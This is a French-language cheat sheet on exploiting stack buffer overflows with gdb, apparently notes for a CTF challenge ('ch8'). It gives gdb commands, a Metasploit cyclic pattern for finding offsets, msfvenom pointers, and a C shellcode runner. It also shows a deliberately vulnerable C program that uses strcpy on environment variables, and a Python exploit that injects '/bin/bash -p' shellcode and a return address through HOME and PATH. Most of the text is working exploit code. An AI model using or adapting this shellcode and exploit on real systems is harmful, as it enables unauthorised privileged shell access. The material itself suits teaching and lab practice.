# BOF (gdb)

## chercher les variables d'environnements:

```gdb
 break main
 run
 x/100x $ebp
 x/200x $ebp
 ...
```

## retrouver l'adresse retour et les parametres de la fonction:

```gdb
 i r
info frame
x/16x $ebp
```
## Trouver l'offset ( autrement qu'avec AAAAAAAAAAAAAAAAAAAAAABBBBCCCC ;) )

```sh
michael@k:~$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
```

## generer son Shellcode:

https://www.exploit-db.com/shellcodes

msfvenom -l payload

## execution directement via C:

```c
#include <stdio.h>

char shellcode[] = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
		   "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
		   "\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
		   "\x51\x53\x89\xe1\xcd\x80";

int main(int argc, char *argv[])
{
       	fprintf(stdout,"Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();       
}
```
 
 
 
 
 

## exemple:

 
 1. #include <stdio.h>
2. #include <stdlib.h>
3. #include <dirent.h>
4. #include <string.h>
5.  
6. struct EnvInfo
7. {
8.   char home[128];
9.   char username[128];
10.   char shell[128];  
11.   char path[128];  
12. };
13.  
14.  
15. struct EnvInfo GetEnv(void)
16. {
17.   struct EnvInfo env;
18.   char *ptr;
19.    
20.   if((ptr = getenv("HOME")) == NULL)
21.     {
22.       printf("[-] Can't find HOME.\n");
23.       exit(0);
24.     }
25.   strcpy(env.home, ptr);
26.   if((ptr = getenv("USERNAME")) == NULL)
27.     {
28.       printf("[-] Can't find USERNAME.\n");
29.       exit(0);
30.     }
31.   strcpy(env.username, ptr);
32.   if((ptr = getenv("SHELL")) == NULL)
33.     {
34.       printf("[-] Can't find SHELL.\n");
35.       exit(0);
36.     }
37.   strcpy(env.shell, ptr);
38.   if((ptr = getenv("PATH")) == NULL)
39.     {
40.       printf("[-] Can't find PATH.\n");
41.       exit(0);
42.     }
43.   strcpy(env.path, ptr);
44.   return env;
45. }
46.  
47. int main(void)
48. {
49.   struct EnvInfo env;
50.    
51.   printf("[+] Getting env...\n");
52.   env = GetEnv();
53.    
54.   printf("HOME     = %s\n", env.home);
55.   printf("USERNAME = %s\n", env.username);
56.   printf("SHELL    = %s\n", env.shell);
57.   printf("PATH     = %s\n", env.path);
58.    
59.   return 0;   
60. }

 
 1. #!/usr/bin/env python2
2. from struct import pack
3.  
4. p = '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'
5.  
6. with open('/tmp/home', 'wb') as f:
7.     f.write(p)
8.  
9. # padding
10. p = 'A' * (0x9C + 4)
11.  
12. # Gadget return (do nothing)
13. p += pack('<I', 0x08048474)
14.  
15. # argument 1 random data address (shell code stored here then exec after return)
16. p += pack('<I', 0x0804a004) * 2
17.  
18.  
19. with open('/tmp/path', 'wb') as f:
20.     f.write(p)
Télécharger
1. HOME=$(cat /tmp/home) PATH=$(cat /tmp/path) ./ch8


